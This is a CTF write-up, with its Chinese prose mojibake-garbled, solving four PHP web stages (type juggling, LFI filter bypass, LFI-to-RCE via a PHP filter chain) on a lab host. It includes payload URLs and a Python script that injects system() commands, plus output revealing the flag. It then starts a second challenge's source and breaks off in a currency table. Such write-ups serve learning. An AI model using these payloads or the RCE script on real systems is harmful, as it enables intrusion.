1. å¼±å‹åˆ¥ + List
    :::spoiler Source Code
    ```php=
    <?php
    include('config.php');
    echo '<h1>ğŸ‘» Stage 1 / 4</h1>';

    $A = $_GET['A'];
    $B = $_GET['B'];

    highlight_file(__FILE__);
    echo '<hr>';

    if (isset($A) && isset($B))
        if ($A != $B)
            if (strcmp($A, $B) == 0)
                if (md5($A) === md5($B))
                    echo "<a href=$stage2>Go to stage2</a>";
                else die('ERROR: MD5(A) != MD5(B)');
            else die('ERROR: strcmp(A, B) != 0');
        else die('ERROR: A == B');
    else die('ERROR: A, B should be given');
    ```
    :::
    è§€å¯Ÿsource codeæœƒç™¼ç¾å°±æ˜¯ä¸€å€‹md5 collisionçš„ç¶“å…¸é¡Œç›®ï¼Œä¸éä»–é‚„æœ‰ä¸€å€‹é™åˆ¶ï¼Œå°±æ˜¯`strcmp($A, $B) == 0`ï¼Œé€™æ˜¯å’Œä¹‹å‰[é‡åˆ°çš„é¡Œç›®](https://hackmd.io/@SBK6401/Byy8Y_V13)ä¸å¤ªä¸€æ¨£çš„åœ°æ–¹ï¼Œå¾Œä¾†æ˜¯åƒè€ƒ[Bypassing PHP strcmp()](https://rst.hashnode.dev/bypassing-php-strcmp)çš„æ–‡ç« ï¼Œå…§æ–‡æåˆ°
    > == is an insecure comparison (loose comparison known as the Equal Operator) if the two strings are equal to each other then it returns true, this does not check data types. If we submit an empty array token[]=something PHP translates GET variables like this to an empty array which causes strcmp() to barf: strcmp(array(), "token") -> NULL which will return 0

    æ„æ€æ˜¯å¦‚æœçµ¦çš„GETåƒæ•¸æ˜¯å€‹listï¼Œé‚£PHPå°±æœƒç†è§£æˆ0ï¼Œå› ç‚ºä»–èªç‚ºæ˜¯å€‹empty arrayï¼Œæ‰€ä»¥é€™ä¸€é¡Œå’Œcollisionæ²’æœ‰é—œä¿‚ï¼Œç´”ç²¹æ˜¯phpçš„è¨­è¨ˆèªè¨€åœ¨å¼±å‹åˆ¥ä»¥åŠèªæ³•ä¸Šæœ‰"å¤ªå¤š"çš„ç©ºé–“å¯ä»¥åˆ©ç”¨
    Payload: `http://172.31.210.1:33002/stage1.php?A[]=QNKCDZO&B[]=240610708`
    ![åœ–ç‰‡](https://hackmd.io/_uploads/BkwaZ4tYT.png)

2. Collision Again
    :::spoiler Source Code
    ```php=
    <?php
    include('config.php');
    echo '<h1>ğŸ‘» Stage 2 / 4</h1>';

    $A = $_GET['A'];
    $B = $_GET['B'];

    highlight_file(__FILE__);
    echo '<hr>';

    if (isset($A) && isset($B))
        if ($A !== $B){
            $is_same = md5($A) == 0 and md5($B) === 0;
            if ($is_same)
                echo (md5($B) ? "QQ1" : md5($A) == 0 ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2");
            else die('ERROR: $is_same is false');
        }
    else die('ERROR: A, B should be given');
    ```
    :::
    é€™ä¸€é¡Œæ²’æœ‰æƒ³å¤ªå¤šå°±ç›´æ¥ç”¨å‰ä¸€é¡Œçš„payloadé€å‡ºå»ï¼Œçµæœpayloadå¤ªå¼·å¤§å°±éäº†==ï¼Œå¾Œä¾†æ˜¯ä»”ç´°å»çœ‹[æ•™å­¸](https://hackmd.io/@Vincent550102/BJwHYfxKp)æ‰çŸ¥é“ä»–çš„è€ƒé»ï¼Œç°¡å–®ä¾†èªªï¼Œåœ¨phpä¸­ï¼Œ`=`çš„é‹ç®—å„ªå…ˆåº¦æ˜¯é«˜æ–¼`and`é‹ç®—çš„ï¼Œæ‰€ä»¥é€å‡ºå‰ä¸€é¡Œçš„payloadï¼Œæœƒé€šé#13çš„åˆ¤æ–·ï¼Œå› ç‚ºå³æ™‚å¾Œé¢æ˜¯ä¸€å€‹falseä¹Ÿæ²’å·®ï¼Œæ¥è‘—å°±æ˜¯ä¸€å€‹ä¸‰å±¤çš„if statementï¼Œç”¨pythonçš„è§’åº¦è§£é‡‹å°±æœƒè®Šæˆ
    ```python
    if md5(B):
        result = "QQ1"
    else:
        if md5(A) == 0:
            result = "<a href={0}?page=swirl.php>Go to stage3</a>".format(stage3)
        else:
            result = "QQ2"
    ```
    è€Œå› ç‚º\$Bæœ¬ä¾†å°±æ²’æ±è¥¿ï¼Œæ‰€ä»¥æœƒé€²åˆ°elseï¼Œå¿…ä¸”md5(\$A)æ˜¯trueï¼Œæ‰€ä»¥æœƒreturn Stage 3çš„linkçµ¦æˆ‘å€‘
    Payload: `http://172.31.210.1:33002/stage2_212ad0bdc4777028af057616450f6654.php/?A[]=QNKCDZO&B[]=240610708`
    ![åœ–ç‰‡](https://hackmd.io/_uploads/SkwCW4Ft6.png)
3. LFI
    :::spoiler Source Code
    ```php=
    <?php
    include('config.php');
    echo '<h1>ğŸ‘» Stage 3 / 4</h1>';

    $page = $_GET['page'];

    highlight_file(__FILE__);
    echo '<hr>';
    if (isset($page)) {
        $path = strtolower($_GET['page']);

        // filter \ _ /
        if (preg_match("/\\_|\//", $path)) {
            echo "<p>bad hecker detect! </p>";
        }else{
            $path = str_replace("..\\", "../", $path);
            $path = str_replace("..", ".", $path);
            echo $path;
            echo '<hr>';
            echo file_get_contents("./page/".$path);
        }
    } else die('ERROR: page should be given');
    ```
    :::
    é€™å€‹å°é¡Œæ˜¯å€‹ç°¡å–®çš„LFIï¼Œè¦æ‰¾çš„æª”æ¡ˆå…¶å¯¦å°±æ˜¯config.php(ä¸ç„¶å…¶å¯¦ä¹Ÿä¸çŸ¥é“è¦æ‰¾ç”šéº¼)ï¼Œé—œéµçš„åœ°æ–¹åœ¨æ–¼ä»–æœ‰è¨­filterï¼Œç°¡å–®bypassä¸€ä¸‹å°±éäº†(æŠŠ`../`è®Šæˆ`....%5c`å°±å¯ä»¥äº†)ï¼Œå–å¾—config.phpå¾Œå°±æ‰“é–‹source code inspectä¸€ä¸‹å°±çŸ¥é“é—œéµstage 4çš„linkäº†
    Payload: `http://172.31.210.1:33002/stage3_099b3b060154898840f0ebdfb46ec78f.php?page=....%5cconfig.php`
    ![åœ–ç‰‡](https://hackmd.io/_uploads/HJAS84tK6.png)
4. LFI2RCE - PHP Filter Chain
é€™ä¸€é¡Œæ˜¯æœ€é›£çš„ï¼Œæœ€å¾Œå¿ä¸ä½é‚„æ˜¯å»çœ‹äº†æ•™å­¸ï¼Œä½†è·Ÿè‘—åšé‚„æ˜¯è¦èŠ±å¥½ä¹…çš„åŠŸå¤«æ‰èƒ½æ‰“ç©¿ï¼Œé€™ä¸€é¡Œå°±æ˜¯å…¸å‹çš„LFI2RCEçš„é¡Œç›®ï¼Œä¸€é–‹å§‹æ˜¯çœ‹[é£›é£›çš„æ–‡ç« ](https://ithelp.ithome.com.tw/articles/10241555)ï¼Œç™¼ç¾ä»–å¯ä»¥æˆåŠŸquery`../../../../../proc/self/environ`é€™å€‹æ±è¥¿ï¼Œæ‰€ä»¥æœ‰ä¸€å¤§åŠæ™‚é–“éƒ½åœ¨æ‰¾å¦‚ä½•ç”¨é€™å€‹æ±è¥¿inject webshellé”åˆ°RCEï¼Œä½†ä¸ç¢ºå®šæ˜¯æ¬Šé™ä¸å¤ é‚„æ˜¯æ€éº¼æ¨£ï¼Œéç¨‹ä¸­å›°é›£é‡é‡ä¹Ÿæ²’æœ‰å¿«è¦æˆåŠŸçš„è·¡è±¡ï¼Œå› æ­¤å°±åªèƒ½å˜—è©¦æ•™å­¸ä¸­æåˆ°çš„php filter chainï¼Œè©±èªª[stevençš„æ–‡ç« ](https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/)å¾ˆå„ªè³ªè€¶ï¼Œå·²ç¶“æ˜¯ä¸€å€‹php lfi2rceçš„æ•™ç§‘æ›¸äº†ï¼Œé‡é»æ˜¯å¯Ÿçœ‹çš„payloadä¾†æºæ–¼[wupcoå¤§çš„script](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)ä¹Ÿæ˜¯æ€éº¼è©¦éƒ½ä¸æˆåŠŸï¼Œæœ€å¾Œæ˜¯å¯Ÿçœ‹[PHP filters chain: What is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)é€™ç¯‡æ–‡ç« æ‰è§£æ±ºï¼Œæˆ‘æ˜¯ç”¨[ä»–å€‘è‡ªå·±å¯«çš„script](https://github.com/synacktiv/php_filter_chain_generator)ï¼Œä¸ç¢ºå®šæ˜¯å“ªå€‹ç’°ç¯€å‡ºå•é¡Œ

#### Exploit
Script For Stage 4
```python=
import requests
import subprocess
from sys import *

url = "http://172.31.210.1:33002/stage4_b182g38e7db23o8eo8qwdehb23asd311.php"

command = ""
for i in argv[1:]:
    command += i + ' '

result = subprocess.Popen(['python', './php_filter_chain_generator/php_filter_chain_generator.py', '--chain', f'<?php system("{command}")?>'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

payload, _ = result.communicate()
# print(payload.splitlines())
data = {"ğŸ‘€": payload.splitlines()[-1]}
response = requests.post(url, data=data)
print(response.text)
```
```bash
$ python exp.py ls
<h1>ğŸ‘» Stage 4 / 4</h1><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">'&lt;h1&gt;ğŸ‘»&nbsp;Stage&nbsp;4&nbsp;/&nbsp;4&lt;/h1&gt;'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />echo&nbsp;</span><span style="color: #DD0000">'&lt;hr&gt;'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">extract</span><span style="color: #007700">(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">);<br /><br />if&nbsp;(isset(</span><span style="color: #0000BB">$ğŸ‘€</span><span style="color: #007700">))&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #0000BB">$ğŸ‘€</span><span style="color: #007700">);<br />else&nbsp;die(</span><span style="color: #DD0000">'ERROR:&nbsp;ğŸ‘€&nbsp;should&nbsp;be&nbsp;given'</span><span style="color: #007700">);</span>
</span>
</code><hr>bin
boot
dev
etc
flag_cr14x5hc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
ï¿½
Pï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@
$ python exp.py cat /flag_cr14x5hc
<h1>ğŸ‘» Stage 4 / 4</h1><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">'&lt;h1&gt;ğŸ‘»&nbsp;Stage&nbsp;4&nbsp;/&nbsp;4&lt;/h1&gt;'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />echo&nbsp;</span><span style="color: #DD0000">'&lt;hr&gt;'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">extract</span><span style="color: #007700">(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">);<br /><br />if&nbsp;(isset(</span><span style="color: #0000BB">$ğŸ‘€</span><span style="color: #007700">))&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #0000BB">$ğŸ‘€</span><span style="color: #007700">);<br />else&nbsp;die(</span><span style="color: #DD0000">'ERROR:&nbsp;ğŸ‘€&nbsp;should&nbsp;be&nbsp;given'</span><span style="color: #007700">);</span>
</span>
</code><hr>TSC{y0u_4r3_my_0ld_p4l}
ï¿½Bï¿½0ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@
```

Flag: `TSC{y0u_4r3_my_0ld_p4l}`

### Palitan ng pera(è³½å¾Œè§£)

#### Description
> It's a currency exchange website.
>
> Author: Vincent55
> Official Writeup - https://github.com/Vincent550102/My-CTF-Challenge/tree/main/TSCCTF-2024#palitan-ng-pera

#### Source Code
* docker-compose.yml
    ```dockerfile!
    version: "3.5"
    services:
        exchange:
            build:
                context: ./src
                args:
                    FLAG: TSCCTF{FAKEFLAG} 
            ports:
                - 33000:80/tcp
    ```
* Dockerfile
    ```dockerfile!
    FROM php:7.4.33-apache

    COPY . /var/www/html

    RUN chown -R www-data:www-data /var/www/html && \
        chmod -R 555 /var/www/html && \
        chown www-data:www-data /var/www/html/upload && \
        chmod 775 /var/www/html/upload

    ARG FLAG
    RUN echo $FLAG > /flag-`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1`

    RUN echo "AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP" >>/etc/apache2/apache2.conf
    USER www-data
    ```
* currency.php
    :::spoiler Source Code
    ```php
    <?php

    # from https://en.wikipedia.org/wiki/List_of_circulating_currencies

    # The exchange rate are unrelated to the solution, so they are all set to 0.87 :>

    $countryData = array(
        "Afghanistan" => array("ISO" => "AFN", "toTWD" => 0.87),
        "Akrotiri and Dhekelia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Albania" => array("ISO" => "ALL", "toTWD" => 0.87),
        "Algeria" => array("ISO" => "DZD", "toTWD" => 0.87),
        "Andorra" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Angola" => array("ISO" => "AOA", "toTWD" => 0.87),
        "Anguilla" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Antigua and Barbuda" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Argentina" => array("ISO" => "ARS", "toTWD" => 0.87),
        "Armenia" => array("ISO" => "AMD", "toTWD" => 0.87),
        "Artsakh" => array("ISO" => "none", "toTWD" => 0.87),
        "Aruba" => array("ISO" => "AWG", "toTWD" => 0.87),
        "Ascension Island" => array("ISO" => "SHP", "toTWD" => 0.87),
        "Australia" => array("ISO" => "AUD", "toTWD" => 0.87),
        "Austria" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Azerbaijan" => array("ISO" => "AZN", "toTWD" => 0.87),
        "Bahamas, The" => array("ISO" => "BSD", "toTWD" => 0.87),
        "Bahrain" => array("ISO" => "BHD", "toTWD" => 0.87),
        "Bangladesh" => array("ISO" => "BDT", "toTWD" => 0.87),
        "Barbados" => array("ISO" => "BBD", "toTWD" => 0.87),
        "Belarus" => array("ISO" => "BYN", "toTWD" => 0.87),
        "Belgium" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Belize" => array("ISO" => "BZD", "toTWD" => 0.87),
        "Benin" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Bermuda" => array("ISO" => "BMD", "toTWD" => 0.87),
        "Bhutan" => array("ISO" => "BTN", "toTWD" => 0.87),
        "Bolivia" => array("ISO" => "BOB", "toTWD" => 0.87),
        "Bonaire" => array("ISO" => "USD", "toTWD" => 0.87),
        "Bosnia and Herzegovina" => array("ISO" => "BAM", "toTWD" => 0.87),
        "Botswana" => array("ISO" => "BWP", "toTWD" => 0.87),
        "Brazil" => array("ISO" => "BRL", "toTWD" => 0.87),
        "British Indian Ocean Territory" => array("ISO" => "USD", "toTWD" => 0.87),
        "British Virgin Islands" => array("ISO" => "USD", "toTWD" => 0.87),
        "Brunei" => array("ISO" => "BND", "toTWD" => 0.87),
        "Bulgaria" => array("ISO" => "BGN", "toTWD" => 0.87),
        "Burkina Faso" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Burundi" => array("ISO" => "BIF", "toTWD" => 0.87),
        "Cambodia" => array("ISO" => "KHR", "toTWD" => 0.87),
        "Cameroon" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Canada" => array("ISO" => "CAD", "toTWD" => 0.87),
        "Cape Verde" => array("ISO" => "CVE", "toTWD" => 0.87),
        "Cayman Islands" => array("ISO" => "KYD", "toTWD" => 0.87),
        "Central African Republic" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Chad" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Chile" => array("ISO" => "CLP", "toTWD" => 0.87),
        "China, People's Republic of" => array("ISO" => "CNY", "toTWD" => 0.87),
        "Colombia" => array("ISO" => "COP", "toTWD" => 0.87),
        "Comoros" => array("ISO" => "KMF", "toTWD" => 0.87),
        "Congo, Democratic Republic of the" => array("ISO" => "CDF", "toTWD" => 0.87),
        "Congo, Republic of the" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Cook Islands" => array("ISO" => "USD", "toTWD" => 0.87),
        "Costa Rica" => array("ISO" => "CRC", "toTWD" => 0.87),
        "CÃ´te d'Ivoire" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Croatia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Cuba" => array("ISO" => "CUP", "toTWD" => 0.87),
        "CuraÃ§ao" => array("ISO" => "ANG", "toTWD" => 0.87),
        "Cyprus" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Czech Republic" => array("ISO" => "CZK", "toTWD" => 0.87),
        "Denmark" => array("ISO" => "DKK", "toTWD" => 0.87),
        "Djibouti" => array("ISO" => "DJF", "toTWD" => 0.87),
        "Dominica" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Dominican Republic" => array("ISO" => "DOP", "toTWD" => 0.87),
        "East Timor" => array("ISO" => "USD", "toTWD" => 0.87),
        "Ecuador" => array("ISO" => "USD", "toTWD" => 0.87),
        "Egypt" => array("ISO" => "EGP", "toTWD" => 0.87),
        "El Salvador" => array("ISO" => "USD", "toTWD" => 0.87),
        "Equatorial Guinea" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Eritrea" => array("ISO" => "ERN", "toTWD" => 0.87),
        "Estonia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Eswatini" => array("ISO" => "SZL", "toTWD" => 0.87),
        "Ethiopia" => array("ISO" => "ETB", "toTWD" => 0.87),
        "Falkland Islands" => array("ISO" => "FKP", "toTWD" => 0.87),
        "Faroe Islands" => array("ISO" => "DKK", "toTWD" => 0.87),
        "Fiji" => array("ISO" => "FJD", "toTWD" => 0.87),
        "Finland" => array("ISO" => "EUR", "toTWD" => 0.87),
        "France" => array("ISO" => "EUR", "toTWD" => 0.87),
        "French Polynesia" => array("ISO" => "XPF", "toTWD" => 0.87),
        "French Southern and Antarctic Lands" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Gabon" => array("ISO" => "XAF", "toTWD" => 0.87),
        "Gambia, The" => array("ISO" => "GMD", "toTWD" => 0.87),
        "Georgia" => array("ISO" => "GEL", "toTWD" => 0.87),
        "Germany" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Ghana" => array("ISO" => "GHS", "toTWD" => 0.87),
        "Gibraltar" => array("ISO" => "GIP", "toTWD" => 0.87),
        "Greece" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Greenland" => array("ISO" => "DKK", "toTWD" => 0.87),
        "Grenada" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Guatemala" => array("ISO" => "GTQ", "toTWD" => 0.87),
        "Guinea" => array("ISO" => "GNF", "toTWD" => 0.87),
        "Guinea-Bissau" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Guyana" => array("ISO" => "GYD", "toTWD" => 0.87),
        "Haiti" => array("ISO" => "HTG", "toTWD" => 0.87),
        "Honduras" => array("ISO" => "HNL", "toTWD" => 0.87),
        "Hong Kong" => array("ISO" => "HKD", "toTWD" => 0.87),
        "Hungary" => array("ISO" => "HUF", "toTWD" => 0.87),
        "Iceland" => array("ISO" => "ISK", "toTWD" => 0.87),
        "India" => array("ISO" => "INR", "toTWD" => 0.87),
        "Indonesia" => array("ISO" => "IDR", "toTWD" => 0.87),
        "Iran" => array("ISO" => "IRR", "toTWD" => 0.87),
        "Iraq" => array("ISO" => "IQD", "toTWD" => 0.87),
        "Ireland" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Isle of Man" => array("ISO" => "none", "toTWD" => 0.87),
        "Israel" => array("ISO" => "ILS", "toTWD" => 0.87),
        "Italy" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Jamaica" => array("ISO" => "JMD", "toTWD" => 0.87),
        "Japan" => array("ISO" => "JPY", "toTWD" => 0.87),
        "Jersey" => array("ISO" => "none", "toTWD" => 0.87),
        "Jordan" => array("ISO" => "JOD", "toTWD" => 0.87),
        "Kazakhstan" => array("ISO" => "KZT", "toTWD" => 0.87),
        "Kenya" => array("ISO" => "KES", "toTWD" => 0.87),
        "Kiribati" => array("ISO" => "none", "toTWD" => 0.87),
        "Korea, North" => array("ISO" => "KPW", "toTWD" => 0.87),
        "Korea, South" => array("ISO" => "KRW", "toTWD" => 0.87),
        "Kosovo" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Kuwait" => array("ISO" => "KWD", "toTWD" => 0.87),
        "Kyrgyzstan" => array("ISO" => "KGS", "toTWD" => 0.87),
        "Laos" => array("ISO" => "LAK", "toTWD" => 0.87),
        "Latvia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Lebanon" => array("ISO" => "LBP", "toTWD" => 0.87),
        "Lesotho" => array("ISO" => "LSL", "toTWD" => 0.87),
        "Liberia" => array("ISO" => "LRD", "toTWD" => 0.87),
        "Libya" => array("ISO" => "LYD", "toTWD" => 0.87),
        "Liechtenstein" => array("ISO" => "CHF", "toTWD" => 0.87),
        "Lithuania" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Luxembourg" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Macau" => array("ISO" => "MOP", "toTWD" => 0.87),
        "Madagascar" => array("ISO" => "MGA", "toTWD" => 0.87),
        "Malawi" => array("ISO" => "MWK", "toTWD" => 0.87),
        "Malaysia" => array("ISO" => "MYR", "toTWD" => 0.87),
        "Maldives" => array("ISO" => "MVR", "toTWD" => 0.87),
        "Mali" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Malta" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Marshall Islands" => array("ISO" => "USD", "toTWD" => 0.87),
        "Mauritania" => array("ISO" => "MRU", "toTWD" => 0.87),
        "Mauritius" => array("ISO" => "MUR", "toTWD" => 0.87),
        "Mexico" => array("ISO" => "MXN", "toTWD" => 0.87),
        "Micronesia" => array("ISO" => "USD", "toTWD" => 0.87),
        "Moldova" => array("ISO" => "MDL", "toTWD" => 0.87),
        "Monaco" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Mongolia" => array("ISO" => "MNT", "toTWD" => 0.87),
        "Montenegro" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Montserrat" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Morocco" => array("ISO" => "MAD", "toTWD" => 0.87),
        "Mozambique" => array("ISO" => "MZN", "toTWD" => 0.87),
        "Myanmar" => array("ISO" => "MMK", "toTWD" => 0.87),
        "Namibia" => array("ISO" => "NAD", "toTWD" => 0.87),
        "Nauru" => array("ISO" => "AUD", "toTWD" => 0.87),
        "Nepal" => array("ISO" => "NPR", "toTWD" => 0.87),
        "Netherlands" => array("ISO" => "EUR", "toTWD" => 0.87),
        "New Caledonia" => array("ISO" => "XPF", "toTWD" => 0.87),
        "New Zealand" => array("ISO" => "NZD", "toTWD" => 0.87),
        "Nicaragua" => array("ISO" => "NIO", "toTWD" => 0.87),
        "Niger" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Nigeria" => array("ISO" => "NGN", "toTWD" => 0.87),
        "Niue" => array("ISO" => "NZD", "toTWD" => 0.87),
        "North Macedonia" => array("ISO" => "MKD", "toTWD" => 0.87),
        "Northern Cyprus" => array("ISO" => "TRY", "toTWD" => 0.87),
        "Norway" => array("ISO" => "NOK", "toTWD" => 0.87),
        "Oman" => array("ISO" => "OMR", "toTWD" => 0.87),
        "Pakistan" => array("ISO" => "PKR", "toTWD" => 0.87),
        "Palau" => array("ISO" => "USD", "toTWD" => 0.87),
        "Palestine" => array("ISO" => "ILS", "toTWD" => 0.87),
        "Panama" => array("ISO" => "PAB", "toTWD" => 0.87),
        "Papua New Guinea" => array("ISO" => "PGK", "toTWD" => 0.87),
        "Paraguay" => array("ISO" => "PYG", "toTWD" => 0.87),
        "Peru" => array("ISO" => "PEN", "toTWD" => 0.87),
        "Philippines" => array("ISO" => "PHP", "toTWD" => 0.87),
        "Pitcairn Islands" => array("ISO" => "NZD", "toTWD" => 0.87),
        "Poland" => array("ISO" => "PLN", "toTWD" => 0.87),
        "Portugal" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Qatar" => array("ISO" => "QAR", "toTWD" => 0.87),
        "Romania" => array("ISO" => "RON", "toTWD" => 0.87),
        "Russia" => array("ISO" => "RUB", "toTWD" => 0.87),
        "Rwanda" => array("ISO" => "RWF", "toTWD" => 0.87),
        "Saba" => array("ISO" => "USD", "toTWD" => 0.87),
        "Sahrawi Republic" => array("ISO" => "MAD", "toTWD" => 0.87),
        "Saint Helena" => array("ISO" => "SHP", "toTWD" => 0.87),
        "Saint Kitts and Nevis" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Saint Lucia" => array("ISO" => "XCD", "toTWD" => 0.87),
        "Saint Pierre and Miquelon" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Samoa" => array("ISO" => "WST", "toTWD" => 0.87),
        "Saint BarthÃ©lemy" => array("ISO" => "EUR", "toTWD" => 0.87),
        "San Marino" => array("ISO" => "EUR", "toTWD" => 0.87),
        "SÃ£o TomÃ© and PrÃ­ncipe" => array("ISO" => "STN", "toTWD" => 0.87),
        "Saudi Arabia" => array("ISO" => "SAR", "toTWD" => 0.87),
        "Senegal" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Serbia" => array("ISO" => "RSD", "toTWD" => 0.87),
        "Seychelles" => array("ISO" => "SCR", "toTWD" => 0.87),
        "Sierra Leone" => array("ISO" => "SLE", "toTWD" => 0.87),
        "Singapore" => array("ISO" => "SGD", "toTWD" => 0.87),
        "Sint Eustatius" => array("ISO" => "USD", "toTWD" => 0.87),
        "Sint Maarten" => array("ISO" => "ANG", "toTWD" => 0.87),
        "Slovakia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Slovenia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Solomon Islands" => array("ISO" => "SBD", "toTWD" => 0.87),
        "Somalia" => array("ISO" => "SOS", "toTWD" => 0.87),
        "South Africa" => array("ISO" => "ZAR", "toTWD" => 0.87),
        "South Ossetia" => array("ISO" => "RUB", "toTWD" => 0.87),
        "South Sudan" => array("ISO" => "SSP", "toTWD" => 0.87),
        "Spain" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Sri Lanka" => array("ISO" => "LKR", "toTWD" => 0.87),
        "Sudan" => array("ISO" => "SDG", "toTWD" => 0.87),
        "Suriname" => array("ISO" => "SRD", "toTWD" => 0.87),
        "Sweden" => array("ISO" => "SEK", "toTWD" => 0.87),
        "Switzerland" => array("ISO" => "CHF", "toTWD" => 0.87),
        "Syria" => array("ISO" => "SYP", "toTWD" => 0.87),
        "Taiwan / Republic of China" => array("ISO" => "TWD", "toTWD" => 0.87),
        "Tajikistan" => array("ISO" => "TJS", "toTWD" => 0.87),
        "Tanzania" => array("ISO" => "TZS", "toTWD" => 0.87),
        "Thailand" => array("ISO" => "THB", "toTWD" => 0.87),
        "Togo" => array("ISO" => "XOF", "toTWD" => 0.87),
        "Tonga" => array("ISO" => "TOP", "toTWD" => 0.87),
        "Transnistria" => array("ISO" => "RUB", "toTWD" => 0.87),
        "Trinidad and Tobago" => array("ISO" => "TTD", "toTWD" => 0.87),
        "Tunisia" => array("ISO" => "TND", "toTWD" => 0.87),
        "Turkey" => array("ISO" => "TRY", "toTWD" => 0.87),
        "Turkmenistan" => array("ISO" => "TMT", "toTWD" => 0.87),
        "Turks and Caicos Islands" => array("ISO" => "USD", "toTWD" => 0.87),
        "Tuvalu" => array("ISO" => "AUD", "toTWD" => 0.87),
        "Uganda" => array("ISO" => "UGX", "toTWD" => 0.87),
        "Ukraine" => array("ISO" => "UAH", "toTWD" => 0.87),
        "United Arab Emirates" => array("ISO" => "AED", "toTWD" => 0.87),
        "United Kingdom" => array("ISO" => "GBP", "toTWD" => 0.87),
        "United States" => array("ISO" => "USD", "toTWD" => 0.87),
        "Uruguay" => array("ISO" => "UYU", "toTWD" => 0.87),
        "Uzbekistan" => array("ISO" => "UZS", "toTWD" => 0.87),
        "Vanuatu" => array("ISO" => "VUV", "toTWD" => 0.87),
